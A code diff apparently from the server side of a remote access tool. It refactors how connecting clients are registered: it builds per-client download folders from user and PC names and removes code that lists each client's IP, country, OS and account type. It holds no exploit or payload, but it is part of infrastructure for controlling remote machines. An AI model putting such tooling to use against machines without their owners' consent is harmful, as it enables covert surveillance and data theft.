@@ -29,32 +29,11 @@ namespace xServer.Core.Commands
                 client.Value.Username = packet.Username;
                 client.Value.PCName = packet.PCName;
                 client.Value.Tag = packet.Tag;
+                client.Value.ImageIndex = packet.ImageIndex;
 
-                string userAtPc = string.Format("{0}@{1}", client.Value.Username, client.Value.PCName);
-
-                client.Value.DownloadDirectory = (!FileHelper.CheckPathForIllegalChars(userAtPc)) ?
-                    Path.Combine(Application.StartupPath, string.Format("Clients\\{0}_{1}\\", userAtPc, client.Value.Id.Substring(0, 7))) :
+                client.Value.DownloadDirectory = (!FileHelper.CheckPathForIllegalChars(client.Value.UserAtPc)) ?
+                    Path.Combine(Application.StartupPath, string.Format("Clients\\{0}_{1}\\", client.Value.UserAtPc, client.Value.Id.Substring(0, 7))) :
                     Path.Combine(Application.StartupPath, string.Format("Clients\\{0}_{1}\\", client.EndPoint.Address, client.Value.Id.Substring(0, 7)));
-
-                FrmMain.Instance.ConServer.CountAllTimeConnectedClientById(client.Value.Id);
-
-                string country = string.Format("{0} [{1}]", client.Value.Country, client.Value.CountryCode);
-
-                // this " " leaves some space between the flag-icon and first item
-                ListViewItem lvi = new ListViewItem(new string[]
-                {
-                    " " + client.EndPoint.Address, client.Value.Tag,
-                    userAtPc, client.Value.Version, "Connected", "Active", country,
-                    client.Value.OperatingSystem, client.Value.AccountType
-                }) { Tag = client, ImageIndex = packet.ImageIndex };
-
-                FrmMain.Instance.AddClientToListview(lvi);
-
-                if (Settings.ShowPopup)
-                    FrmMain.Instance.ShowPopup(client);
-
-                client.Value.IsAuthenticated = true;
-                new Packets.ServerPackets.SetAuthenticationSuccess().Execute(client);
 
                 if (Settings.ShowToolTip)
                     new Packets.ServerPackets.GetSystemInfo().Execute(client);
